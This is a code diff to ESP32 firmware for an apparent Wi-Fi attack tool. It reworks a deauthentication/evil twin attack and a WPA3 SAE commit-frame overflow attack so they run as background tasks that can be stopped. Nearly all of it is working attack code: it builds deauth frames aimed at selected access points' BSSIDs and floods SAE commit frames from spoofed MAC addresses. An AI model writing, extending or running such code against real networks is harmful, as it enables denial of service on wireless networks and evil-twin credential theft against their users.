@@ -116,6 +116,14 @@ static int64_t sniffer_last_channel_hop = 0;
 static const int sniffer_channel_hop_delay_ms = 250; // 250ms per channel like Marauder
 static TaskHandle_t sniffer_channel_task_handle = NULL;
 
+// Deauth/Evil Twin attack task
+static TaskHandle_t deauth_attack_task_handle = NULL;
+static volatile bool deauth_attack_active = false;
+
+// SAE Overflow attack task
+static TaskHandle_t sae_attack_task_handle = NULL;
+static volatile bool sae_attack_active = false;
+
 // Dual-band channel list (2.4GHz + 5GHz like Marauder)
 static const int dual_band_channels[] = {
     // 2.4GHz channels
@@ -201,6 +209,9 @@ static int cmd_reboot(int argc, char **argv);
 static esp_err_t start_background_scan(void);
 static void print_scan_results(void);
 static void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, size_t count);
+// Attack task forward declarations
+static void deauth_attack_task(void *pvParameters);
+static void sae_attack_task(void *pvParameters);
 // Sniffer functions
 static void sniffer_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
 static void sniffer_process_scan_results(void);
@@ -355,14 +366,18 @@ static void wifi_event_handler(void *event_handler_arg,
                 }
                 
                 // Change LED to green for active sniffing
-                ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 255, 0)); // Green
-                ESP_ERROR_CHECK(led_strip_refresh(strip));
+                esp_err_t led_err = led_strip_set_pixel(strip, 0, 0, 255, 0); // Green
+                if (led_err == ESP_OK) {
+                    led_strip_refresh(strip);
+                }
                 
                 MY_LOG_INFO(TAG, "Sniffer: Scan complete, now monitoring client traffic with dual-band channel hopping (2.4GHz + 5GHz)...");
             } else {
-                // Clear LED when normal scan is complete
-                ESP_ERROR_CHECK(led_strip_clear(strip));
-                ESP_ERROR_CHECK(led_strip_refresh(strip));
+                // Clear LED when normal scan is complete (ignore errors if LED is in invalid state)
+                esp_err_t led_err = led_strip_clear(strip);
+                if (led_err == ESP_OK) {
+                    led_strip_refresh(strip);
+                }
             }
             break;
         }
@@ -632,14 +647,20 @@ static int cmd_scan_networks(int argc, char **argv) {
     // Reset stop flag at the beginning of operation
     operation_stop_requested = false;
     
-    ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 255, 0));
-    ESP_ERROR_CHECK(led_strip_refresh(strip));
+    // Set LED (ignore errors if LED is in invalid state)
+    esp_err_t led_err = led_strip_set_pixel(strip, 0, 0, 255, 0);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
 
     esp_err_t err = start_background_scan();
     
     if (err != ESP_OK) {
-        ESP_ERROR_CHECK(led_strip_clear(strip));
-        ESP_ERROR_CHECK(led_strip_refresh(strip));
+        // Clear LED (ignore errors if LED is in invalid state)
+        led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
         
         if (err == ESP_ERR_INVALID_STATE) {
             MY_LOG_INFO(TAG, "Scan already in progress. Use 'show_scan_results' to see current results or 'stop' to cancel.");
@@ -724,6 +745,58 @@ static int cmd_select_networks(int argc, char **argv) {
 
 int onlyDeauth = 0;
 
+// Deauth attack task function (runs in background)
+static void deauth_attack_task(void *pvParameters) {
+    (void)pvParameters;
+    
+    MY_LOG_INFO(TAG,"Deauth attack task started.");
+    
+    //Main loop of deauth frames sending:
+    while (deauth_attack_active && 
+           ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK))) {
+        // Check for stop request (check at start of loop for faster response)
+        if (operation_stop_requested || !deauth_attack_active) {
+            MY_LOG_INFO(TAG, "Deauth attack: Stop requested, terminating...");
+            operation_stop_requested = false;
+            deauth_attack_active = false;
+            applicationState = IDLE;
+            
+            // Clean up after attack (ignore LED errors)
+            esp_err_t led_err = led_strip_clear(strip);
+            if (led_err == ESP_OK) {
+                led_strip_refresh(strip);
+            }
+            
+            break;
+        }
+        
+        if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
+            // Send deauth frames (silent mode - no UART spam)
+            ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
+            ESP_ERROR_CHECK(led_strip_refresh(strip));
+            wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
+            ESP_ERROR_CHECK(led_strip_clear(strip));
+            ESP_ERROR_CHECK(led_strip_refresh(strip));
+        }
+        
+        // Delay and yield to allow UART console processing
+        vTaskDelay(pdMS_TO_TICKS(100));
+        taskYIELD(); // Give other tasks (including console) a chance to run
+    }
+    
+    // Clean up LED after attack finishes naturally (ignore LED errors)
+    esp_err_t led_err = led_strip_clear(strip);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    deauth_attack_active = false;
+    deauth_attack_task_handle = NULL;
+    MY_LOG_INFO(TAG,"Deauth attack task finished.");
+    
+    vTaskDelete(NULL); // Delete this task
+}
+
 static int cmd_start_deauth(int argc, char **argv) {
     onlyDeauth = 1;
     return cmd_start_evil_twin(argc, argv);
@@ -733,27 +806,60 @@ static int cmd_start_sae_overflow(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
     
+    // Check if SAE attack is already running
+    if (sae_attack_active || sae_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "SAE overflow attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
     // Reset stop flag at the beginning of operation
     operation_stop_requested = false;
 
-   if (g_selected_count == 1) {
-
+    if (g_selected_count == 1) {
         applicationState = SAE_OVERFLOW;
         int idx = g_selected_indices[0];
         const wifi_ap_record_t *ap = &g_scan_results[idx];
-        ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 255, 0, 0));
-        ESP_ERROR_CHECK(led_strip_refresh(strip));
-        MY_LOG_INFO(TAG,"Starting WPA3 SAE Overflow for SSID='%s' Auth=%d", (const char*)ap->ssid, ap->authmode);
-        //Main loop of SAE frames sending is invoked from this method:
-        startRandomMacSaeClientOverflow(*ap);
-        //this will be invoked only in future when attack termination is addded to the projectL
-        ESP_ERROR_CHECK(led_strip_clear(strip));
-        ESP_ERROR_CHECK(led_strip_refresh(strip));
-        MY_LOG_INFO(TAG,"SAE Overflow: finished attack. Reboot your board.");
+        
+        // Set LED
+        esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 0, 0);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
+        MY_LOG_INFO(TAG,"WPA3 SAE Overflow Attack");
+        MY_LOG_INFO(TAG,"Target: SSID='%s' Ch=%d Auth=%d", (const char*)ap->ssid, ap->primary, ap->authmode);
+        MY_LOG_INFO(TAG,"SAE attack started. Use 'stop' to stop.");
+        
+        // Allocate memory for ap_record to pass to task
+        wifi_ap_record_t *ap_copy = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t));
+        if (ap_copy == NULL) {
+            MY_LOG_INFO(TAG, "Failed to allocate memory for SAE attack!");
+            applicationState = IDLE;
+            return 1;
+        }
+        memcpy(ap_copy, ap, sizeof(wifi_ap_record_t));
+        
+        // Start SAE attack in background task
+        sae_attack_active = true;
+        BaseType_t result = xTaskCreate(
+            sae_attack_task,
+            "sae_task",
+            8192,  // Larger stack size for crypto operations
+            ap_copy,
+            5,     // Priority
+            &sae_attack_task_handle
+        );
+        
+        if (result != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to create SAE overflow task!");
+            free(ap_copy);
+            sae_attack_active = false;
+            applicationState = IDLE;
+            return 1;
+        }
+        
     } else {
-        vTaskDelay(pdMS_TO_TICKS(100));
         MY_LOG_INFO(TAG,"SAE Overflow: you need to select exactly ONE network (use select_networks).");
-        vTaskDelay(pdMS_TO_TICKS(100));
     }
     return 0;
 }
@@ -769,11 +875,16 @@ static int cmd_start_evil_twin(int argc, char **argv) {
     //avoid compiler warnings:
     (void)argc; (void)argv;
     
+    // Check if attack is already running
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Deauth attack already running. Use 'stop' to stop it first.");
+        return 1;
+    }
+    
     // Reset stop flag at the beginning of operation
     operation_stop_requested = false;
 
     if (g_selected_count > 0) {
-
         applicationState = DEAUTH_EVIL_TWIN;
 
         const char *sourceSSID = (const char *)g_scan_results[g_selected_indices[0]].ssid;
@@ -794,34 +905,34 @@ static int cmd_start_evil_twin(int argc, char **argv) {
         }
 
         MY_LOG_INFO(TAG,"Evil twin: %s", evilTwinSSID);
+        MY_LOG_INFO(TAG,"Attacking %d network(s):", g_selected_count);
         for (int i = 0; i < g_selected_count; ++i) {
             int idx = g_selected_indices[i];
             wifi_ap_record_t *ap = &g_scan_results[idx];
-            MY_LOG_INFO(TAG,"  [%d] SSID='%s' RSSI=%d Auth=%d", idx, (const char*)ap->ssid, ap->rssi, ap->authmode);
+            MY_LOG_INFO(TAG,"  [%d] SSID='%s' Ch=%d RSSI=%d", idx, (const char*)ap->ssid, ap->primary, ap->rssi);
         }
-        //Main loop of deauth frames sending:
-        while ((applicationState == DEAUTH) || (applicationState == DEAUTH_EVIL_TWIN) || (applicationState == EVIL_TWIN_PASS_CHECK)) {
-            // Check for stop request
-            if (operation_stop_requested) {
-                MY_LOG_INFO(TAG, "Evil twin: Stop requested, terminating...");
-                operation_stop_requested = false;
-                applicationState = IDLE;
-                break;
-            }
-            
-            if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN) {
-                ESP_LOGD(TAG,"Evil twin: sending deauth frames to %d selected APs...", g_selected_count);        
-                ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 0, 0, 255));
-                ESP_ERROR_CHECK(led_strip_refresh(strip));
-                wsl_bypasser_send_deauth_frame_multiple_aps(g_scan_results, g_selected_count);
-                ESP_ERROR_CHECK(led_strip_clear(strip));
-                ESP_ERROR_CHECK(led_strip_refresh(strip));
-            }
-            vTaskDelay(pdMS_TO_TICKS(100));
+        MY_LOG_INFO(TAG,"Deauth attack started. Use 'stop' to stop.");
+        
+        // Start deauth attack in background task
+        deauth_attack_active = true;
+        BaseType_t result = xTaskCreate(
+            deauth_attack_task,
+            "deauth_task",
+            4096,  // Stack size
+            NULL,
+            5,     // Priority
+            &deauth_attack_task_handle
+        );
+        
+        if (result != pdPASS) {
+            MY_LOG_INFO(TAG, "Failed to create deauth attack task!");
+            deauth_attack_active = false;
+            applicationState = IDLE;
+            return 1;
         }
-        MY_LOG_INFO(TAG,"Evil twin: finished attack. Reboot your board.");
+        
     } else {
-        MY_LOG_INFO(TAG,"Evl twin: no selected APs (use select_networks).");
+        MY_LOG_INFO(TAG,"Evil twin: no selected APs (use select_networks).");
     }
     return 0;
 }
@@ -829,9 +940,58 @@ static int cmd_start_evil_twin(int argc, char **argv) {
 static int cmd_stop(int argc, char **argv) {
     (void)argc; (void)argv;
     MY_LOG_INFO(TAG, "Stop command received - stopping all operations...");
+    
+    // Set global stop flags
     operation_stop_requested = true;
     wardrive_active = false;
-    applicationState = IDLE;
+    
+    // Stop deauth attack task if running
+    if (deauth_attack_active || deauth_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping deauth attack task...");
+        deauth_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && deauth_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (deauth_attack_task_handle != NULL) {
+            vTaskDelete(deauth_attack_task_handle);
+            deauth_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "Deauth attack task forcefully stopped.");
+        }
+    }
+    
+    // Stop SAE overflow attack task if running
+    if (sae_attack_active || sae_attack_task_handle != NULL) {
+        MY_LOG_INFO(TAG, "Stopping SAE overflow task...");
+        sae_attack_active = false;
+        
+        // Wait a bit for task to finish
+        for (int i = 0; i < 20 && sae_attack_task_handle != NULL; i++) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+        }
+        
+        // Force delete if still running
+        if (sae_attack_task_handle != NULL) {
+            vTaskDelete(sae_attack_task_handle);
+            sae_attack_task_handle = NULL;
+            MY_LOG_INFO(TAG, "SAE overflow task forcefully stopped.");
+        }
+    }
+    
+    // Stop any active attacks
+    if (applicationState == DEAUTH || applicationState == DEAUTH_EVIL_TWIN || 
+        applicationState == EVIL_TWIN_PASS_CHECK || applicationState == SAE_OVERFLOW) {
+        MY_LOG_INFO(TAG, "Stopping active attack (state: %d)...", applicationState);
+        applicationState = IDLE;
+        
+        // Disable promiscuous mode if it was enabled for SAE_OVERFLOW
+        esp_wifi_set_promiscuous(false);
+    } else {
+        applicationState = IDLE;
+    }
     
     // Stop background scan if in progress
     if (g_scan_in_progress) {
@@ -862,9 +1022,13 @@ static int cmd_stop(int argc, char **argv) {
         MY_LOG_INFO(TAG, "Sniffer stopped. Data preserved - use 'show_sniffer_results' to view.");
     }
     
-    // Clear LED
-    ESP_ERROR_CHECK(led_strip_clear(strip));
-    ESP_ERROR_CHECK(led_strip_refresh(strip));
+    // Clear LED (ignore errors if LED is in invalid state)
+    esp_err_t led_err = led_strip_clear(strip);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    } else {
+        ESP_LOGW(TAG, "Failed to clear LED (state: %s), ignoring...", esp_err_to_name(led_err));
+    }
     
     MY_LOG_INFO(TAG, "All operations stopped.");
     return 0;
@@ -892,15 +1056,23 @@ static int cmd_start_sniffer(int argc, char **argv) {
     sniffer_active = true;
     sniffer_scan_phase = true;
     
-    ESP_ERROR_CHECK(led_strip_set_pixel(strip, 0, 255, 255, 0)); // Yellow
-    ESP_ERROR_CHECK(led_strip_refresh(strip));
+    // Set LED (ignore errors if LED is in invalid state)
+    esp_err_t led_err = led_strip_set_pixel(strip, 0, 255, 255, 0); // Yellow
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
     
     esp_err_t err = start_background_scan();
     if (err != ESP_OK) {
         sniffer_active = false;
         sniffer_scan_phase = false;
-        ESP_ERROR_CHECK(led_strip_clear(strip));
-        ESP_ERROR_CHECK(led_strip_refresh(strip));
+        
+        // Clear LED (ignore errors if LED is in invalid state)
+        led_err = led_strip_clear(strip);
+        if (led_err == ESP_OK) {
+            led_strip_refresh(strip);
+        }
+        
         MY_LOG_INFO(TAG, "Failed to start scan for sniffer: %s", esp_err_to_name(err));
         return 1;
     }
@@ -1462,37 +1634,45 @@ void wsl_bypasser_send_deauth_frame_multiple_aps(wifi_ap_record_t *ap_records, s
         //first, spend some time waiting for ESP-NOW signal that password has been provided which is expected on channel 1:
         esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
         //MY_LOG_INFO(TAG, "Waiting for ESP-NOW signal on channel 1 before deauth...");
-        vTaskDelay(pdMS_TO_TICKS(300));
+        
+        // Wait in smaller chunks to allow UART processing
+        for (int wait = 0; wait < 300; wait += 50) {
+            vTaskDelay(pdMS_TO_TICKS(50));
+            if (operation_stop_requested) {
+                return; // Exit early if stop requested
+            }
+        }
         //MY_LOG_INFO(TAG, "Finished waiting for ESP-NOW...");
     }
 
     //then, proceed with deauth frames on channels of the APs:
     for (int i = 0; i < g_selected_count; ++i) {
+        if (applicationState == EVIL_TWIN_PASS_CHECK ) {
+            ESP_LOGW(TAG, "Checking for password...");
+            return;
+        }
+        
+        // Check for stop request
+        if (operation_stop_requested) {
+            ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
+            return;
+        }
 
-            if (applicationState == EVIL_TWIN_PASS_CHECK ) {
-                ESP_LOGW(TAG, "Checking for password...");
-                return;
-            }
-            
-            // Check for stop request
-            if (operation_stop_requested) {
-                ESP_LOGW(TAG, "Deauth: Stop requested, terminating...");
-                return;
-            }
-
-            int idx = g_selected_indices[i];
-            wifi_ap_record_t *ap_record = &g_scan_results[idx];
-            ESP_LOGD(TAG, "Preparations to send deauth frame...");
-            MY_LOG_INFO(TAG, "Deauth SSID: %s, CH: %d", ap_record->ssid, ap_record->primary);
-            ESP_LOGD(TAG, "Target BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
-                    ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
-                    ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
-            esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
-            uint8_t deauth_frame[sizeof(deauth_frame_default)];
-            memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-            memcpy(&deauth_frame[10], ap_record->bssid, 6);
-            memcpy(&deauth_frame[16], ap_record->bssid, 6);
-            wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
+        int idx = g_selected_indices[i];
+        wifi_ap_record_t *ap_record = &g_scan_results[idx];
+        
+        // Debug logging only (disabled by default to avoid UART spam)
+        ESP_LOGD(TAG, "Sending deauth to SSID: %s, CH: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
+                ap_record->ssid, ap_record->primary,
+                ap_record->bssid[0], ap_record->bssid[1], ap_record->bssid[2],
+                ap_record->bssid[3], ap_record->bssid[4], ap_record->bssid[5]);
+        
+        esp_wifi_set_channel(ap_record->primary, WIFI_SECOND_CHAN_NONE );
+        uint8_t deauth_frame[sizeof(deauth_frame_default)];
+        memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
+        memcpy(&deauth_frame[10], ap_record->bssid, 6);
+        memcpy(&deauth_frame[16], ap_record->bssid, 6);
+        wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
     }
 
 }
@@ -1553,21 +1733,67 @@ static void update_spoofed_src_random(void) {
     next_src = (next_src + 1) % NUM_CLIENTS;
 }
 
-void startRandomMacSaeClientOverflow(const wifi_ap_record_t ap_record) {
-    prepareAttack(ap_record);
-    while (1) {
-        // Check for stop request
-        if (operation_stop_requested) {
-            MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
-            operation_stop_requested = false;
-            applicationState = IDLE;
-            break;
+// SAE Overflow attack task function (runs in background)
+static void sae_attack_task(void *pvParameters) {
+    wifi_ap_record_t *ap_record = (wifi_ap_record_t *)pvParameters;
+    
+    MY_LOG_INFO(TAG, "SAE overflow task started.");
+    
+    prepareAttack(*ap_record);
+    int frame_count_check = 0;
+    
+    while (sae_attack_active) {
+        // Check for stop request (check every 10 frames for better responsiveness)
+        if (frame_count_check % 10 == 0) {
+            if (operation_stop_requested || !sae_attack_active) {
+                MY_LOG_INFO(TAG, "SAE overflow: Stop requested, terminating...");
+                operation_stop_requested = false;
+                sae_attack_active = false;
+                applicationState = IDLE;
+                
+                // Clean up after attack
+                esp_wifi_set_promiscuous(false);
+                
+                // Clear LED (ignore errors if LED is in invalid state)
+                esp_err_t led_err = led_strip_clear(strip);
+                if (led_err == ESP_OK) {
+                    led_strip_refresh(strip);
+                }
+                
+                break;
+            }
+            
+            // Yield to allow UART console processing every 10 frames
+            taskYIELD();
         }
         
         inject_sae_commit_frame();
-        vTaskDelay(pdMS_TO_TICKS(25));
+        
+        // Delay to allow UART console processing (50ms gives better responsiveness)
+        vTaskDelay(pdMS_TO_TICKS(50));
+        frame_count_check++;
     }
+    
+    // Clean up LED after attack finishes naturally (ignore LED errors)
+    esp_err_t led_err = led_strip_clear(strip);
+    if (led_err == ESP_OK) {
+        led_strip_refresh(strip);
+    }
+    
+    // Clean up after attack
+    esp_wifi_set_promiscuous(false);
+    
+    sae_attack_active = false;
+    sae_attack_task_handle = NULL;
+    MY_LOG_INFO(TAG, "SAE overflow task finished.");
+    
+    // Free the allocated memory for ap_record
+    free(pvParameters);
+    
+    vTaskDelete(NULL); // Delete this task
 }
+
+// Legacy function removed - SAE attack now runs directly as task via cmd_start_sae_overflow
 
 
 /*
@@ -1658,7 +1884,10 @@ void inject_sae_commit_frame() {
         int64_t now = esp_timer_get_time();
         double seconds = (now - start_time) / 1e6;
         double fps = frame_count / seconds;
-        MY_LOG_INFO(TAG, "AVG FPS: %.2f", fps);
+        
+        // Debug logging only (disabled by default to avoid UART spam)
+        ESP_LOGD(TAG, "SAE Overflow: AVG FPS: %.2f", fps);
+        
         framesPerSecond = (int)fps;
         frame_count = 0;
         if (framesPerSecond == 0) {
@@ -1901,9 +2130,11 @@ static void sniffer_channel_hop(void) {
     esp_wifi_set_channel(sniffer_current_channel, WIFI_SECOND_CHAN_NONE);
     sniffer_last_channel_hop = esp_timer_get_time() / 1000;
     
-    // Optional: Log channel changes with band info
+    // Optional: Log channel changes with band info (debug mode)
+    #if 0
     const char* band = (sniffer_current_channel <= 14) ? "2.4GHz" : "5GHz";
-    //MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
+    MY_LOG_INFO(TAG, "Sniffer: Hopped to channel %d (%s)", sniffer_current_channel, band);
+    #endif
 }
 
 // Task that handles time-based channel hopping (independent of packet flow)
